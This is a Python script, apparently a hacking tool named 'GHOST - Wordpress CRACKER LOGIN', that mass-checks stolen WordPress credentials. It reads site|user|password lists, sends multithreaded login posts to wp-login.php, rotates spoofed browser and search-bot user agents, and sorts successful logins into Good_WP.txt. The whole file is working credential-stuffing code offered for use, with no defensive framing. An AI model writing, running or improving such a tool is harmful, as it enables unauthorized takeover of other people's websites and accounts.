import requests
import os
import platform
import logging
import random
from colorama import Fore, init
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import RequestException

# Initialisation de colorama et configuration du logging
init(autoreset=True)
logging.basicConfig(level=logging.CRITICAL, format='%(asctime)s - %(levelname)s - %(message)s')

# Liste des User-Agents pour simuler différents navigateurs
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0 Mobile/15A372 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)',
    'Mozilla/5.0 (Macintosh; PPC Mac OS X 10_5_8) AppleWebKit/533.19.4 (KHTML, like Gecko) Safari/533.19.4'
]

def clear_terminal():
    """Efface le terminal."""
    os.system('cls' if platform.system() == 'Windows' else 'clear')

def print_banner():
    """Affiche une bannière stylisée."""
    banner = """\033[1;33m\033[1m
         .-.
       .'   `.          -----------------------------------
       :g g   :         | GHOST - Wordpress CRACKER LOGIN |  
       : o    `.        |       @CODE BY HackFut X XYZEAZ |
      :         ``.     -----------------------------------
     :             `.
    :  :         .   `.
    :   :          ` . `.
     `.. :            `. ``;
        `:;             `:' 
           :              `.
            `.              `.     . 
              `'`'`'`---..,___`;.-'
                                                                                     
    \033[0m"""

    description = """\033[1;37m
    ▶ This tool validates WordPress login credentials and saves the results in categorized files
    ▶ Results are stored in 'Good_WP.txt' (Success Logged in) and 'Bad_WP.txt' (Failed login) for review.
    ▶ I Hope You Enjoy By Using it  
    \033[0m"""

    print(banner)
    print(description)

def parse_line(line):
    """Parse une ligne pour extraire l'URL, l'utilisateur et le mot de passe."""
    if '|' in line:
        parts = line.split('|')
    elif ';' in line:
        parts = line.split(';')
    elif ':' in line:
        parts = line.split(':')
    else:
        parts = line.split()

    if len(parts) != 3:
        raise ValueError(f"Invalid line format: {line}")
    
    site = parts[0].strip()
    if not site.startswith('http'):
        site = f"http://{site}/wp-login.php"
    return site, parts[1].strip(), parts[2].strip()

def check(line):
    """Vérifie les identifiants WordPress."""
    try:
        site, user, passwd = parse_line(line)
    except ValueError as e:
        print(Fore.RED + f"\n[] Skipping invalid line: {e}")
        return

    reset = "\033[0m"
    headers = {
        'User-Agent': random.choice(user_agents),
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/plain'
    }

    if not passwd:
        result = (f"[\033[1;33m{datetime.now().strftime('%H:%M:%S')}{reset}] - "
                  f"[\033[1;37m{site}{reset}] - [\033[1;34m{user}{reset}] - "
                  f"[\033[1;31mEmpty Password{reset}]")
        print(result)
        with open("Bad_WP.txt", "a", encoding="utf-8") as bad_file:
            bad_file.write(f"{site}|{user}|{passwd}\n")
        return

    try:
        login_data = {
            'log': user,
            'pwd': passwd,
            'wp-submit': 'Log In',
            'redirect_to': f"{site}/wp-admin/",
            'testcookie': 1
        }

        response = requests.post(url=site, headers=headers, data=login_data, timeout=10, allow_redirects=True)
        current_time = datetime.now().strftime("%H:%M:%S")

        if 'dashboard' in response.text and 'wp-login.php' not in response.url:
            result = (f"[\033[1;33m{current_time}{reset}] - [\033[1;37m{site}{reset}] - "
                      f"[\033[1;34m{user}{reset}] - [\033[1;34m{passwd}{reset}] - [\033[1;32mSuccess Logged in{reset}]")
            print(result)
            with open("Good_WP.txt", "a", encoding="utf-8") as good_file:
                good_file.write(f"{site}|{user}|{passwd}\n")
        else:
            result = (f"[\033[1;33m{current_time}{reset}] - [\033[1;37m{site}{reset}] - "
                      f"[\033[1;34m{user}{reset}] - [\033[1;34m{passwd}{reset}] - [\033[1;31mFailed login{reset}]")
            print(result)
            with open("Bad_WP.txt", "a", encoding="utf-8") as bad_file:
                bad_file.write(f"{site}|{user}|{passwd}\n")
    except RequestException as e:
        result = (f"[\033[1;33m{datetime.now().strftime('%H:%M:%S')}{reset}] - [\033[1;37m{site}{reset}] - "
                  f"[\033[1;34m{user}{reset}] - [\033[1;34m{passwd}{reset}] - [\033[1;31mError: {str(e)}{reset}]")
        print(result)
        with open("Bad_WP.txt", "a", encoding="utf-8") as bad_file:
            bad_file.write(f"{site}|{user}|{passwd}\n")

def load_list(filename, max_threads=20):
    """Charge la liste et vérifie les identifiants."""
    try:
        with open(filename, 'r', encoding="utf-8") as file:
            lines = file.read().splitlines()
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            executor.map(check, lines)
    except Exception as e:
        print(Fore.RED + f"\n[] An error occurred while processing the list: {str(e)}")

def main():
    clear_terminal()
    print_banner()

    list_file = input(Fore.CYAN + "\n[] Enter The List: " + Fore.RESET)
    max_threads = input(Fore.CYAN + "\n[] Enter the number of threads (default: 20): " + Fore.RESET) or 20

    try:
        max_threads = int(max_threads)
    except ValueError:
        print(Fore.RED + "\n[] Invalid thread count. Using default value of 20.")
        max_threads = 20

    load_list(list_file, max_threads)

if __name__ == "__main__":
    main()